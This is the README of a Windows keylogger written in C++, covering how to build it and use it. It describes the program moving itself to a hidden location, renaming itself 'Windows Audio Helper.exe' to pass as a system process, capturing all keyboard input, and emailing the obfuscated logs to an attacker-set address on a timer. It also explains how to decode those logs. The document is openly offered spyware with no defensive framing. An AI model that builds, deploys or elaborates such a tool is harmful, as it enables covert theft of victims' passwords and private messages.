# C++ Keylogger
This is a simple keylogger written in C++ designed for windows.

# Installation

Requirements:
 - Visual C++ 11
 - Any C++ compiler (g++ was used by author)
 
First set settings in the src/settings.cpp file,
then compile by going to the main folder in cmd and typing
.\build [name of output file here]
You can give the .exe file any name you want.
The executable will be in the bin folder.

# Use

The keylogger will only work if the following requirements are met:
- The settings in the setttings.cpp file were properly set 
	( if not, the program will automatically create an ERROR_README.txt file detailing the error)
- The program is started on a Windows [ 7, 8, 8.1 or 10 ] system 
	( other versions of windows work only if powershell is installed)
- The program succeeds to set a keyboard hook. 

To start the keylogger, launch the .exe file in any location and (if set to do so in the settings.cpp file) it will try to move itself to a safe path, rename itself to "Windows Audio Helper.exe" and start logging all input.
The program will send the logged keys in a file "app.log" to the configured email-adress every x hours. You can set the interval between these mails in the settings.cpp file.
The logs are encrypted using base64 in combination with some salts. To decrypt the files, use the "decrypt.exe" in the "B64_DECODER" folder like this: "~\Keylogger\B64_DECODER\decrypt.exe app.log decryptedFileName.log".